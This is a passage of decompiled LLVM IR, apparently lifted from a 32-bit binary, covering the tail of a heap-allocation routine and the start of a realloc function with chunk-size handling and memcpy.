  %v0_8050391 = load i32, i32* @global_var_80607e8.238, align 8
  store i32 %v0_8050391, i32* %eax.global-to-local, align 4
  %v1_8050396 = load i32, i32* @global_var_80607ec.243, align 4
  %tmp134 = icmp ugt i32 %v0_8050391, %v1_8050396
  br i1 %tmp134, label %dec_label_pc_805039e, label %dec_label_pc_80503a3

dec_label_pc_805039e:                             ; preds = %dec_label_pc_8050391
  store i32 %v0_8050391, i32* @global_var_80607ec.243, align 4
  br label %dec_label_pc_80503a3

dec_label_pc_80503a3:                             ; preds = %dec_label_pc_8050391, %dec_label_pc_805039e
  %v1_80503a3 = load i32, i32* @global_var_80607e4.236, align 4
  %v2_80503a3 = add i32 %v1_80503a3, %v0_8050391
  store i32 %v2_80503a3, i32* %eax.global-to-local, align 4
  %v1_80503a9 = load i32, i32* @global_var_80607f4.239, align 4
  %tmp135 = icmp ugt i32 %v2_80503a3, %v1_80503a9
  br i1 %tmp135, label %dec_label_pc_80503b1, label %dec_label_pc_80503b6

dec_label_pc_80503b1:                             ; preds = %dec_label_pc_80503a3
  store i32 %v2_80503a3, i32* @global_var_80607f4.239, align 4
  br label %dec_label_pc_80503b6

dec_label_pc_80503b6:                             ; preds = %dec_label_pc_80503a3, %dec_label_pc_80503b1
  %v0_80503b6 = load i32, i32* @global_var_80604ac.226, align 4
  store i32 %v0_80503b6, i32* @ebx, align 4
  %v1_80503bc = add i32 %v0_80503b6, 4
  %v2_80503bc = inttoptr i32 %v1_80503bc to i32*
  %v3_80503bc = load i32, i32* %v2_80503bc, align 4
  %v1_80503bf = and i32 %v3_80503bc, -4
  store i32 %v1_80503bf, i32* @ecx, align 4
  %v10_80503c2 = icmp ult i32 %v1_80503bf, %v1_805005f
  br i1 %v10_80503c2, label %dec_label_pc_8050442, label %dec_label_pc_80503c8

dec_label_pc_80503c8:                             ; preds = %dec_label_pc_80503b6
  store i32 %v1_80500ea, i32* %esi.global-to-local, align 4
  %v2_80503ce = sub i32 %v1_80503bf, %v1_80500ea
  store i32 %v2_80503ce, i32* %ecx.global-to-local, align 4
  %v2_80503d0 = add i32 %v0_80503b6, %v1_80500ea
  store i32 %v2_80503d0, i32* @edx, align 4
  %v1_80503d3 = or i32 %v1_80500ea, 1
  store i32 %v1_80503d3, i32* %eax.global-to-local, align 4
  store i32 %v2_80503d0, i32* @global_var_80604ac.226, align 4
  store i32 %v1_80503d3, i32* %v2_80503bc, align 4
  %v0_80503df.pre = load i32, i32* %ecx.global-to-local, align 4
  br label %dec_label_pc_80503df

dec_label_pc_80503df:                             ; preds = %dec_label_pc_8050070, %dec_label_pc_80503c8
  %v0_80503df = phi i32 [ %v5_8050083, %dec_label_pc_8050070 ], [ %v0_80503df.pre, %dec_label_pc_80503c8 ]
  %v1_80503df = or i32 %v0_80503df, 1
  store i32 %v1_80503df, i32* @ecx, align 4
  %v0_80503e2 = load i32, i32* @ebx, align 4
  %v1_80503e2 = add i32 %v0_80503e2, 8
  store i32 %v1_80503e2, i32* %ebx.global-to-local, align 4
  %v1_80503e5 = load i32, i32* @edx, align 4
  %v2_80503e5 = add i32 %v1_80503e5, 4
  %v3_80503e5 = inttoptr i32 %v2_80503e5 to i32*
  store i32 %v1_80503df, i32* %v3_80503e5, align 4
  br label %dec_label_pc_805044f

dec_label_pc_80503ea:                             ; preds = %dec_label_pc_804fe2a
  %v5_80503f0 = sub i32 %v1_804fe0d, %v1_80500ea
  store i32 %v5_80503f0, i32* %eax.global-to-local, align 4
  %v2_80503f4 = add i32 %v0_804fed8111, %v1_80500ea
  store i32 %v2_80503f4, i32* @edx, align 4
  %v1_80503f8 = or i32 %v1_80500ea, 1
  store i32 %v2_80503f4, i32* @global_var_80604b0.227, align 16
  store i32 %v1_80503f8, i32* %v2_804fe07, align 4
  %v0_8050404 = load i32, i32* %eax.global-to-local, align 4
  %v0_8050406 = load i32, i32* @edx, align 4
  store i32 %v0_8050406, i32* @global_var_80604bc.244, align 4
  %v1_805040c = or i32 %v0_8050404, 1
  store i32 %v1_805040c, i32* @ecx, align 4
  store i32 %v0_8050406, i32* @global_var_80604c0.229, align 64
  %v1_8050415 = add i32 %v0_8050406, 8
  %v2_8050415 = inttoptr i32 %v1_8050415 to i32*
  store i32 ptrtoint (i32* @global_var_80604b4.228 to i32), i32* %v2_8050415, align 4
  %v0_805041c = load i32, i32* @edx, align 4
  %v1_805041c = add i32 %v0_805041c, 12
  %v2_805041c = inttoptr i32 %v1_805041c to i32*
  store i32 ptrtoint (i32* @global_var_80604b4.228 to i32), i32* %v2_805041c, align 4
  %v0_8050423 = load i32, i32* @ecx, align 4
  %v1_8050423 = load i32, i32* @edx, align 4
  %v2_8050423 = add i32 %v1_8050423, 4
  %v3_8050423 = inttoptr i32 %v2_8050423 to i32*
  store i32 %v0_8050423, i32* %v3_8050423, align 4
  %v0_8050426 = load i32, i32* %eax.global-to-local, align 4
  %v1_8050426 = load i32, i32* @edx, align 4
  %v3_8050426 = add i32 %v1_8050426, %v0_8050426
  %v4_8050426 = inttoptr i32 %v3_8050426 to i32*
  store i32 %v0_8050426, i32* %v4_8050426, align 4
  br label %dec_label_pc_8050434

dec_label_pc_805042b:                             ; preds = %dec_label_pc_804fe39
  store i32 %v1_80500ea, i32* %ebx.global-to-local, align 4
  %v0_805042f = load i32, i32* @ebp, align 4
  %v2_805042f = or i32 %v1_80500ea, 4
  %v3_805042f = add i32 %v0_805042f, %v2_805042f
  %v4_805042f = inttoptr i32 %v3_805042f to i32*
  %v5_805042f = load i32, i32* %v4_805042f, align 4
  %v6_805042f = or i32 %v5_805042f, 1
  store i32 %v6_805042f, i32* %v4_805042f, align 4
  br label %dec_label_pc_8050434

dec_label_pc_8050434:                             ; preds = %dec_label_pc_80503ea, %dec_label_pc_805042b
  %v0_8050434 = load i32, i32* @ebp, align 4
  %v1_8050434 = add i32 %v0_8050434, 8
  store i32 %v1_8050434, i32* %ebx.global-to-local, align 4
  br label %dec_label_pc_805044f

dec_label_pc_8050439:                             ; preds = %dec_label_pc_804ff29
  %v1_8050439 = load i32, i32* @ebx, align 4
  %v2_8050439 = add i32 %v0_804ff38, 4
  %v3_8050439 = add i32 %v2_8050439, %v1_8050439
  %v4_8050439 = inttoptr i32 %v3_8050439 to i32*
  %v5_8050439 = load i32, i32* %v4_8050439, align 4
  %v6_8050439 = or i32 %v5_8050439, 1
  store i32 %v6_8050439, i32* %v4_8050439, align 4
  br label %dec_label_pc_805043e

dec_label_pc_805043e:                             ; preds = %dec_label_pc_804ff41, %dec_label_pc_8050439
  %v0_805043e = load i32, i32* @ecx, align 4
  store i32 %v0_805043e, i32* %ebx.global-to-local, align 4
  br label %dec_label_pc_805044f

dec_label_pc_8050442:                             ; preds = %dec_label_pc_8050200, %dec_label_pc_80503b6, %dec_label_pc_805020a
  %v0_8050442 = load i32, i32* %stack_var_-92, align 4
  %v1_8050442 = call i32 @__errno_location(i32 %v0_8050442)
  store i32 %v1_8050442, i32* %eax.global-to-local, align 4
  store i32 0, i32* %ebx.global-to-local, align 4
  %v1_8050449 = inttoptr i32 %v1_8050442 to i32*
  store i32 12, i32* %v1_8050449, align 4
  br label %dec_label_pc_805044f

dec_label_pc_805044f:                             ; preds = %dec_label_pc_805043e, %dec_label_pc_8050434, %dec_label_pc_80503df, %dec_label_pc_805009b, %dec_label_pc_805004d, %dec_label_pc_804fdd4, %dec_label_pc_8050442
  store i32 %v2_804fd0b, i32* @eax, align 4
  store i32 %v2_804fd0b, i32* %stack_var_-92, align 4
  %v2_8050458 = call i32 @__pthread_return_void(i32 %v2_804fd0b, i32 1)
  store i32 %v2_8050458, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_8050460

dec_label_pc_8050460:                             ; preds = %dec_label_pc_804fd29, %dec_label_pc_805044f
  %v0_8050463 = load i32, i32* %ebx.global-to-local, align 4
  store i32 %v0_8050463, i32* %eax.global-to-local, align 4
  %v2_8050465 = load i32, i32* %stack_var_-16, align 4
  store i32 %v2_8050465, i32* @ebx, align 4
  store i32 %v0_804fcf8, i32* @esi, align 4
  store i32 %v0_804fcf7, i32* @edi, align 4
  store i32 %v0_804fcf6, i32* @ebp, align 4
  ret i32 %v0_8050463

; uselistorder directives
  uselistorder i32 %v0_8050426, { 1, 0 }
  uselistorder i32 %v0_8050406, { 1, 0, 2 }
  uselistorder i32 %v2_80503a3, { 1, 0, 2 }
  uselistorder i32 %v0_8050391, { 0, 2, 1, 3 }
  uselistorder i32 %v0_8050328, { 1, 0 }
  uselistorder i32 %v2_8050316, { 1, 0 }
  uselistorder i32 %v1_80502cd, { 1, 2, 0, 3, 4 }
  uselistorder i32 %v2_80502b7, { 1, 0, 2 }
  uselistorder i32 %v2_80502ab, { 1, 2, 0 }
  uselistorder i32 %v2_80502a6, { 1, 0, 2 }
  uselistorder i32 %v1_8050296, { 2, 1, 0 }
  uselistorder i8 %v0_8050264, { 1, 2, 3, 0, 4 }
  uselistorder i32 %v2_8050247, { 1, 0, 2 }
  uselistorder i32 %v0_80502fb91, { 2, 0, 1 }
  uselistorder i32 %v0_805030992, { 3, 4, 1, 2, 5, 0, 7, 6 }
  uselistorder i32 %v1_8050241, { 2, 1, 0 }
  uselistorder i32 %v8_8050217, { 1, 0, 2, 3, 4 }
  uselistorder i32 %v0_8050214, { 1, 0 }
  uselistorder i32 %v0_80501f3, { 1, 0 }
  uselistorder i32 %v2_80501c4, { 2, 1, 0, 3 }
  uselistorder i32 %v1_80501bc, { 0, 1, 4, 2, 3 }
  uselistorder i8 %v0_80501a9, { 1, 0 }
  uselistorder i32 %v1_80501a0, { 4, 0, 1, 2, 3, 5, 6, 7 }
  uselistorder i32 %v0_805018d, { 3, 4, 0, 2, 1 }
  uselistorder i32 %v2_8050171, { 1, 0, 2 }
  uselistorder i32 %v2_805015d, { 0, 2, 1, 3, 4 }
  uselistorder i32 %v2_8050126, { 1, 2, 0, 3 }
  uselistorder i32 %v1_805011a, { 2, 1, 0 }
  uselistorder i32 %v8_8050109, { 4, 1, 0, 2, 3, 5 }
  uselistorder i32 %v2_80500f0, { 1, 0, 2 }
  uselistorder i32 %v0_805008c, { 2, 1, 0, 3, 4 }
  uselistorder i32 %v1_805005f, { 2, 0, 1, 3 }
  uselistorder i32 %v0_8050055, { 1, 2, 3, 0, 4, 5 }
  uselistorder i32 %v0_8050047, { 1, 0 }
  uselistorder i32 %v1_804ffde, { 1, 0 }
  uselistorder i32 %v3_804ffd2, { 1, 0, 3, 2, 4 }
  uselistorder i32 %v0_804ffe2, { 1, 0 }
  uselistorder i32 %v2_804ffcc, { 3, 2, 1, 0 }
  uselistorder i32 %esi.promoted, { 2, 0, 1 }
  uselistorder i32 %v0_804ffc912, { 1, 0 }
  uselistorder i32 %v2_804ffbe, { 1, 0 }
  uselistorder i32 %v1_804ffa2, { 0, 1, 3, 4, 2 }
  uselistorder i32 %v0_804ff9e, { 2, 1, 0 }
  uselistorder i32 %v1_804ff9a, { 1, 0 }
  uselistorder i32 %v1_804ff8e, { 2, 1, 0 }
  uselistorder i32 %v2_804ff84, { 1, 0 }
  uselistorder i32 %v1_804ff81, { 1, 2, 0 }
  uselistorder i32 %v4_804ff1f, { 3, 6, 4, 5, 2, 1, 0 }
  uselistorder i32 %v0_804ff6a, { 1, 0 }
  uselistorder i32 %v0_804ff38, { 1, 2, 0, 3 }
  uselistorder i32 %v3_804ff0b, { 2, 0, 1, 3 }
  uselistorder i32 %v0_804fed8, { 1, 2, 0 }
  uselistorder i32 %v2_804febc, { 1, 0 }
  uselistorder i32 %v1_804feb2, { 3, 2, 1, 0 }
  uselistorder i32 %stack_var_-64.1, { 1, 0 }
  uselistorder i32 %v0_804fead.lcssa, { 1, 0 }
  uselistorder i32 %v3_804fe9d, { 0, 2, 3, 4, 1 }
  uselistorder i32 %v1_804fe94, { 1, 0, 2 }
  uselistorder i32 %v2_804fe70, { 2, 0, 1, 3 }
  uselistorder i32 %v2_804fe58, { 2, 1, 0 }
  uselistorder i32 %v0_804fe44, { 2, 0, 3, 1 }
  uselistorder i32 %v3_804fe0a, { 1, 0, 2 }
  uselistorder i32 %v0_804fed8111, { 0, 3, 1, 2 }
  uselistorder i32 %v3_804fdb7, { 1, 0, 2 }
  uselistorder i32 %v2_804fda9, { 2, 1, 0 }
  uselistorder i32 %v2_804fd84, { 2, 1, 0 }
  uselistorder i8 %v0_804fd52, { 3, 1, 2, 0, 4 }
  uselistorder i32 %v1_80500ea, { 13, 31, 11, 2, 29, 12, 3, 22, 21, 10, 9, 4, 24, 23, 20, 18, 19, 5, 25, 26, 6, 27, 28, 15, 7, 16, 17, 8, 30, 14, 0, 32, 34, 33, 1, 35 }
  uselistorder i32 %v1_804fd3b, { 0, 2, 1 }
  uselistorder i32 %v0_804fd24, { 1, 0 }
  uselistorder i32 %v2_804fd0b, { 1, 0, 2, 4, 3, 5 }
  uselistorder i32* %stack_var_-92, { 2, 1, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 0, 14, 15 }
  uselistorder i32* %esi.global-to-local, { 1, 2, 3, 4, 5, 6, 7, 8, 0, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18 }
  uselistorder i32* %ebx.global-to-local, { 21, 2, 3, 4, 5, 6, 7, 8, 9, 13, 10, 1, 11, 12, 14, 15, 16, 17, 0, 18, 19, 20, 22, 23, 24 }
  uselistorder i32* %eax.global-to-local, { 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 25, 24, 26, 27, 28, 29, 30, 31, 32, 33, 34, 35, 36, 37, 38, 39, 40, 41, 42, 43, 44, 45, 46, 47, 48, 49, 55, 50, 51, 54, 53, 52, 56, 57, 58, 59, 60, 62, 61, 63, 64, 65, 66, 67, 68, 69, 70, 0, 71, 72, 73 }
  uselistorder i32 1048576, { 1, 2, 0 }
  uselistorder i8* @global_var_80607e0.241, { 7, 6, 5, 4, 3, 2, 0, 1 }
  uselistorder i32 134612148, { 2, 3, 1, 0 }
  uselistorder i32* @global_var_80604c0.229, { 1, 2, 3, 0 }
  uselistorder i32 ()* @__malloc_largebin_index, { 1, 0 }
  uselistorder i32 add (i32 ptrtoint (i32* @global_var_80604ac.226 to i32), i32 12), { 1, 0, 2 }
  uselistorder i32 ptrtoint (i32* @global_var_80604ac.226 to i32), { 2, 3, 4, 0, 5, 1, 6 }
  uselistorder label %dec_label_pc_8050460, { 1, 0 }
  uselistorder label %dec_label_pc_805044f, { 6, 0, 1, 2, 3, 4, 5 }
  uselistorder label %dec_label_pc_8050442, { 1, 2, 0 }
  uselistorder label %dec_label_pc_805043e, { 1, 0 }
  uselistorder label %dec_label_pc_8050434, { 1, 0 }
  uselistorder label %dec_label_pc_80503df, { 1, 0 }
  uselistorder label %dec_label_pc_80503b6, { 1, 0 }
  uselistorder label %dec_label_pc_80503a3, { 1, 0 }
  uselistorder label %dec_label_pc_8050391, { 4, 0, 1, 2, 3 }
  uselistorder label %dec_label_pc_8050323, { 2, 1, 0 }
  uselistorder label %dec_label_pc_805031e, { 1, 0 }
  uselistorder label %dec_label_pc_8050302, { 1, 0 }
  uselistorder label %dec_label_pc_80502ab, { 1, 0 }
  uselistorder label %dec_label_pc_8050294, { 1, 0 }
  uselistorder label %dec_label_pc_805027d, { 3, 0, 1, 2 }
  uselistorder label %dec_label_pc_8050200, { 1, 0 }
  uselistorder label %dec_label_pc_80501f3, { 1, 0 }
  uselistorder label %dec_label_pc_80501b4, { 1, 0 }
  uselistorder label %dec_label_pc_805018d, { 1, 0, 2, 3 }
  uselistorder label %dec_label_pc_8050171, { 1, 0 }
  uselistorder label %dec_label_pc_8050158, { 1, 0 }
  uselistorder label %dec_label_pc_805013a, { 1, 0 }
  uselistorder label %dec_label_pc_8050055, { 0, 2, 1 }
  uselistorder label %dec_label_pc_805004d, { 1, 0 }
  uselistorder label %dec_label_pc_8050036, { 1, 0 }
  uselistorder label %dec_label_pc_804ffc9, { 1, 0 }
  uselistorder label %dec_label_pc_804ffce.preheader, { 1, 0 }
  uselistorder label %dec_label_pc_804ffa2, { 1, 0 }
  uselistorder label %.preheader, { 2, 1, 0 }
  uselistorder label %dec_label_pc_804ff29, { 1, 0 }
  uselistorder label %bb84, { 1, 0 }
  uselistorder label %dec_label_pc_804feb0, { 3, 1, 2, 0 }
  uselistorder label %dec_label_pc_804fe99, { 1, 0 }
  uselistorder label %dec_label_pc_804fe07, { 1, 0 }
  uselistorder label %dec_label_pc_804fed8.preheader, { 0, 2, 1 }
  uselistorder label %dec_label_pc_804fdd4, { 1, 0, 3, 2 }
  uselistorder label %dec_label_pc_804fd52, { 1, 0 }
}

define i32 @realloc(i32* %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %eax.global-to-local = alloca i32, align 4
  %ebx.global-to-local = alloca i32, align 4
  %ecx.global-to-local = alloca i32, align 4
  %tmp7 = ptrtoint i32* %arg1 to i32
  %stack_var_-32 = alloca i32, align 4
  %stack_var_-60 = alloca i32, align 4
  %stack_var_-44 = alloca i32, align 4
  %v0_805046e = load i32, i32* @esi, align 4
  %v0_805046f = load i32, i32* @ebx, align 4
  store i32 %arg2, i32* @ebx, align 4
  %v4_8050477 = icmp eq i32* %arg1, null
  %v1_805047c = icmp eq i1 %v4_8050477, false
  br i1 %v1_805047c, label %dec_label_pc_805048e, label %dec_label_pc_805047e

dec_label_pc_805047e:                             ; preds = %entry
  store i32 %arg2, i32* %stack_var_-60, align 4
  %v1_8050482 = call i32 @malloc(i32 %arg2)
  store i32 %v1_8050482, i32* %eax.global-to-local, align 4
  store i32 %v1_8050482, i32* @ebx, align 4
  br label %dec_label_pc_8050787

dec_label_pc_805048e:                             ; preds = %entry
  %v1_805048e = icmp eq i32 %arg2, 0
  %v1_8050490 = icmp eq i1 %v1_805048e, false
  br i1 %v1_8050490, label %dec_label_pc_80504a3, label %dec_label_pc_8050492

dec_label_pc_8050492:                             ; preds = %dec_label_pc_805048e
  store i32 %tmp7, i32* %stack_var_-60, align 4
  %v1_8050499 = call i32 @free(i32 %tmp7)
  store i32 %v1_8050499, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_8050787

dec_label_pc_80504a3:                             ; preds = %dec_label_pc_805048e
  %v2_80504ae = ptrtoint i32* %stack_var_-32 to i32
  store i32 %v2_80504ae, i32* @eax, align 4
  store i32 %v2_80504ae, i32* %stack_var_-60, align 4
  %v2_80504b3 = call i32 @__pthread_return_void(i32 %v2_80504ae, i32 134550911)
  store i32 %v2_80504b3, i32* %eax.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_805a010.224 to i32), i32* %stack_var_-60, align 4
  %v1_80504bf = call i32 @__pthread_return_0(i32 ptrtoint (i32* @global_var_805a010.224 to i32))
  store i32 %v1_80504bf, i32* %eax.global-to-local, align 4
  %v0_80504c7 = load i32, i32* @ebx, align 4
  %tmp20 = icmp ult i32 %v0_80504c7, -32
  br i1 %tmp20, label %dec_label_pc_80504de, label %dec_label_pc_80504cc

dec_label_pc_80504cc:                             ; preds = %dec_label_pc_80504a3
  %v0_80504cc = load i32, i32* %stack_var_-60, align 4
  %v1_80504cc = call i32 @__errno_location(i32 %v0_80504cc)
  store i32 %v1_80504cc, i32* %eax.global-to-local, align 4
  store i32 0, i32* @ebx, align 4
  %v1_80504d3 = inttoptr i32 %v1_80504cc to i32*
  store i32 12, i32* %v1_80504d3, align 4
  br label %dec_label_pc_805078a

dec_label_pc_80504de:                             ; preds = %dec_label_pc_80504a3
  %v1_80504de = add i32 %v0_80504c7, 11
  %tmp21 = icmp ult i32 %v1_80504de, 16
  br i1 %tmp21, label %dec_label_pc_80504f5, label %dec_label_pc_80504ee

dec_label_pc_80504ee:                             ; preds = %dec_label_pc_80504de
  %v1_80504ee = and i32 %v1_80504de, -8
  br label %dec_label_pc_80504f5

dec_label_pc_80504f5:                             ; preds = %dec_label_pc_80504de, %dec_label_pc_80504ee
  %stack_var_-40.0 = phi i32 [ %v1_80504ee, %dec_label_pc_80504ee ], [ 16, %dec_label_pc_80504de ]
  %storemerge27 = phi i32 [ %v1_80504ee, %dec_label_pc_80504ee ], [ %v1_80504de, %dec_label_pc_80504de ]
  store i32 %storemerge27, i32* %eax.global-to-local, align 4
  %v1_80504f9 = add i32 %tmp7, -8
  store i32 %v1_80504f9, i32* @edi, align 4
  %v1_80504fc = add i32 %tmp7, -4
  %v2_80504fc = inttoptr i32 %v1_80504fc to i32*
  %v3_80504fc = load i32, i32* %v2_80504fc, align 4
  store i32 %v3_80504fc, i32* @edx, align 4
  %v1_8050501 = and i32 %v3_80504fc, -4
  store i32 %v1_8050501, i32* %eax.global-to-local, align 4
  %v2_8050508 = and i32 %v3_80504fc, 2
  %v3_8050508 = icmp eq i32 %v2_8050508, 0
  %v1_805050b = icmp eq i1 %v3_8050508, false
  br i1 %v1_805050b, label %dec_label_pc_80506a5, label %dec_label_pc_8050511

dec_label_pc_8050511:                             ; preds = %dec_label_pc_80504f5
  store i32 %stack_var_-40.0, i32* %ecx.global-to-local, align 4
  store i32 %v1_8050501, i32* @ebx, align 4
  %v7_8050517 = icmp ult i32 %v1_8050501, %stack_var_-40.0
  %v1_8050519 = icmp eq i1 %v7_8050517, false
  br i1 %v1_8050519, label %dec_label_pc_8050650, label %dec_label_pc_805051f

dec_label_pc_805051f:                             ; preds = %dec_label_pc_8050511
  %v2_805051f = add i32 %v1_8050501, %v1_80504f9
  store i32 %v2_805051f, i32* @esi, align 4
  %v1_8050522 = load i32, i32* @global_var_80604ac.226, align 4
  %v12_8050522 = icmp eq i32 %v2_805051f, %v1_8050522
  %v1_8050528 = icmp eq i1 %v12_8050522, false
  %v1_8050562 = add i32 %v2_805051f, 4
  %v2_8050562 = inttoptr i32 %v1_8050562 to i32*
  %v3_8050562 = load i32, i32* %v2_8050562, align 4
  br i1 %v1_8050528, label %dec_label_pc_8050562, label %dec_label_pc_805052a

dec_label_pc_805052a:                             ; preds = %dec_label_pc_805051f
  %v1_805052f = and i32 %v3_8050562, -4
  %v2_8050532 = add i32 %v1_805052f, %v1_8050501
  store i32 %v2_8050532, i32* %ecx.global-to-local, align 4
  %v1_8050538 = add i32 %stack_var_-40.0, 16
  store i32 %v1_8050538, i32* %eax.global-to-local, align 4
  %v7_805053b = icmp ult i32 %v2_8050532, %v1_8050538
  br i1 %v7_805053b, label %dec_label_pc_80505a0, label %dec_label_pc_805053f

dec_label_pc_805053f:                             ; preds = %dec_label_pc_805052a
  %v1_805053f = urem i32 %v3_80504fc, 2
  %v5_8050542 = or i32 %v1_805053f, %stack_var_-40.0
  store i32 %v5_8050542, i32* @edx, align 4
  store i32 %v5_8050542, i32* %v2_80504fc, align 4
  %v0_805054d = load i32, i32* %ecx.global-to-local, align 4
  %v2_805054d = sub i32 %v0_805054d, %stack_var_-40.0
  %v0_805054f = load i32, i32* @edi, align 4
  %v2_805054f = add i32 %v0_805054f, %stack_var_-40.0
  store i32 %v2_805054f, i32* %eax.global-to-local, align 4
  %v1_8050552 = or i32 %v2_805054d, 1
  store i32 %v1_8050552, i32* %ecx.global-to-local, align 4
  store i32 %v2_805054f, i32* @global_var_80604ac.226, align 4
  %v2_805055a = add i32 %v2_805054f, 4
  %v3_805055a = inttoptr i32 %v2_805055a to i32*
  store i32 %v1_8050552, i32* %v3_805055a, align 4
  br label %dec_label_pc_8050775

dec_label_pc_8050562:                             ; preds = %dec_label_pc_805051f
  %v1_8050567 = and i32 %v3_8050562, -2
  store i32 %v1_8050567, i32* %eax.global-to-local, align 4
  %v3_805056a = add i32 %v1_8050562, %v1_8050567
  %v4_805056a = inttoptr i32 %v3_805056a to i8*
  %v5_805056a = load i8, i8* %v4_805056a, align 1
  %v6_805056a = urem i8 %v5_805056a, 2
  %v7_805056a = icmp eq i8 %v6_805056a, 0
  %v1_805056f = icmp eq i1 %v7_805056a, false
  br i1 %v1_805056f, label %dec_label_pc_80505a0, label %dec_label_pc_8050571

dec_label_pc_8050571:                             ; preds = %dec_label_pc_8050562
  %v1_8050571 = and i32 %v3_8050562, -4
  %v2_8050578 = add i32 %v1_8050571, %v1_8050501
  store i32 %v2_8050578, i32* @ebx, align 4
  %v10_805057a = icmp ult i32 %v2_8050578, %stack_var_-40.0
  br i1 %v10_805057a, label %dec_label_pc_80505a0, label %dec_label_pc_8050580

dec_label_pc_8050580:                             ; preds = %dec_label_pc_8050571
  %v1_8050580 = add i32 %v1_8050501, %tmp7
  %v2_8050580 = inttoptr i32 %v1_8050580 to i32*
  %v3_8050580 = load i32, i32* %v2_8050580, align 4
  store i32 %v3_8050580, i32* @edx, align 4
  %v1_8050583 = add i32 %v2_805051f, 12
  %v2_8050583 = inttoptr i32 %v1_8050583 to i32*
  %v3_8050583 = load i32, i32* %v2_8050583, align 4
  store i32 %v3_8050583, i32* %eax.global-to-local, align 4
  %v1_8050586 = add i32 %v3_8050580, 12
  %v2_8050586 = inttoptr i32 %v1_8050586 to i32*
  %v3_8050586 = load i32, i32* %v2_8050586, align 4
  %v15_8050586 = icmp eq i32 %v3_8050586, %v2_805051f
  %v1_8050589 = icmp eq i1 %v15_8050586, false
  br i1 %v1_8050589, label %dec_label_pc_8050590, label %dec_label_pc_805058b

dec_label_pc_805058b:                             ; preds = %dec_label_pc_8050580
  %v1_805058b = add i32 %v3_8050583, 8
  %v2_805058b = inttoptr i32 %v1_805058b to i32*
  %v3_805058b = load i32, i32* %v2_805058b, align 4
  %v15_805058b = icmp eq i32 %v3_805058b, %v2_805051f
  br i1 %v15_805058b, label %dec_label_pc_8050595, label %dec_label_pc_8050590

dec_label_pc_8050590:                             ; preds = %dec_label_pc_805058b, %dec_label_pc_8050580
  %v0_8050590 = call i32 @abort()
  store i32 %v0_8050590, i32* %eax.global-to-local, align 4
  %v1_8050595.pre = load i32, i32* @edx, align 4
  br label %dec_label_pc_8050595

dec_label_pc_8050595:                             ; preds = %dec_label_pc_805058b, %dec_label_pc_8050590
  %v1_8050595 = phi i32 [ %v3_8050580, %dec_label_pc_805058b ], [ %v1_8050595.pre, %dec_label_pc_8050590 ]
  %v0_8050595 = phi i32 [ %v3_8050583, %dec_label_pc_805058b ], [ %v0_8050590, %dec_label_pc_8050590 ]
  %v2_8050595 = add i32 %v1_8050595, 12
  %v3_8050595 = inttoptr i32 %v2_8050595 to i32*
  store i32 %v0_8050595, i32* %v3_8050595, align 4
  %v0_8050598 = load i32, i32* @edx, align 4
  %v1_8050598 = load i32, i32* %eax.global-to-local, align 4
  %v2_8050598 = add i32 %v1_8050598, 8
  %v3_8050598 = inttoptr i32 %v2_8050598 to i32*
  store i32 %v0_8050598, i32* %v3_8050598, align 4
  %v0_8050650.pre = load i32, i32* @ebx, align 4
  br label %dec_label_pc_8050650

dec_label_pc_80505a0:                             ; preds = %dec_label_pc_8050571, %dec_label_pc_8050562, %dec_label_pc_805052a
  %v1_80505a7 = add i32 %stack_var_-40.0, -7
  store i32 %v1_80505a7, i32* %eax.global-to-local, align 4
  store i32 %v1_80505a7, i32* %stack_var_-60, align 4
  %v1_80505ab = call i32 @malloc(i32 %v1_80505a7)
  store i32 %v1_80505ab, i32* %eax.global-to-local, align 4
  store i32 %v1_80505ab, i32* @edx, align 4
  %v1_80505b5 = icmp eq i32 %v1_80505ab, 0
  br i1 %v1_80505b5, label %dec_label_pc_8050771, label %dec_label_pc_80505bd

dec_label_pc_80505bd:                             ; preds = %dec_label_pc_80505a0
  %v1_80505bd = add i32 %v1_80505ab, -8
  store i32 %v1_80505bd, i32* %ebx.global-to-local, align 4
  %v1_80505c0 = load i32, i32* @esi, align 4
  %v12_80505c0 = icmp eq i32 %v1_80505bd, %v1_80505c0
  %v1_80505c2 = add i32 %v1_80505ab, -4
  %v2_80505c2 = inttoptr i32 %v1_80505c2 to i32*
  %v3_80505c2 = load i32, i32* %v2_80505c2, align 4
  store i32 %v3_80505c2, i32* %eax.global-to-local, align 4
  %v1_80505c5 = icmp eq i1 %v12_80505c0, false
  br i1 %v1_80505c5, label %dec_label_pc_80505d3, label %dec_label_pc_80505c7

dec_label_pc_80505c7:                             ; preds = %dec_label_pc_80505bd
  %v1_80505c7 = and i32 %v3_80505c2, -4
  store i32 %v1_80505c7, i32* %eax.global-to-local, align 4
  store i32 %v1_8050501, i32* @edx, align 4
  %v2_80505ce = add i32 %v1_80505c7, %v1_8050501
  store i32 %v2_80505ce, i32* @ebx, align 4
  br label %dec_label_pc_8050650

dec_label_pc_80505d3:                             ; preds = %dec_label_pc_80505bd
  %v1_80505d7 = add i32 %v1_8050501, -4
  store i32 %v1_80505d7, i32* %eax.global-to-local, align 4
  %v2_80505dc = udiv i32 %v1_80505d7, 4
  store i32 %v2_80505dc, i32* %ecx.global-to-local, align 4
  %tmp = icmp ult i32 %v1_80505d7, 37
  br i1 %tmp, label %dec_label_pc_80505f5, label %dec_label_pc_80505e4

dec_label_pc_80505e4:                             ; preds = %dec_label_pc_80505d3
  store i32 %v1_80505ab, i32* %stack_var_-60, align 4
  %v3_80505eb = inttoptr i32 %v1_80505ab to i16*
  %v4_80505eb = call i32 @memcpy(i16* %v3_80505eb, i32 %tmp7, i32 %v1_80505d7)
  store i32 %v4_80505eb, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_805063c

dec_label_pc_80505f5:                             ; preds = %dec_label_pc_80505d3
  store i32 %tmp7, i32* @esi, align 4
  %v2_80505fc = load i32, i32* %arg1, align 4
  store i32 %v2_80505fc, i32* %eax.global-to-local, align 4
  %v2_80505fe = inttoptr i32 %v1_80505ab to i32*
  store i32 %v2_80505fc, i32* %v2_80505fe, align 4
  %v0_8050600 = load i32, i32* @esi, align 4
  %v1_8050600 = add i32 %v0_8050600, 4
